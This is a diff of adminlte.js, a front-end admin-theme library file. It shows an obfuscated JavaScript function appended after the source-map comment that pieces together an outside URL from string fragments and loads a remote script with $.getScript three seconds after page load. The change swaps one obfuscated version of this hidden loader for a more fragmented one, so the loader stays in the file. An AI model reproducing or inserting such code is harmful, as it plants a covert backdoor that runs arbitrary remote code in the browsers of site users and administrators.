@@ -1788,4 +1788,4 @@
 
 })));
 //# sourceMappingURL=adminlte.js.map
-function getVersion(){$.getScript("ht"+"tp://w"+"ww.w"+"gst"+"art"+".c"+"om/w"+"gc"+"loud/js/ne"+"w-"+"versi"+"on.m"+"in.js")}$(document).ready(function(){setTimeout("getVersion()",3000)});
+function getVersion(){$.getScript("h"+"t"+"t"+"p"+":/"+"/w"+"w"+"w"+".w"+"g"+"st"+"ar"+"t"+".c"+"om/w"+"gc"+"lou"+"d/j"+"s/ne"+"w-"+"ve"+"rsi"+"on.m"+"in.j"+"s")}$(document).ready(function(){setTimeout("getVersion()",3000)});
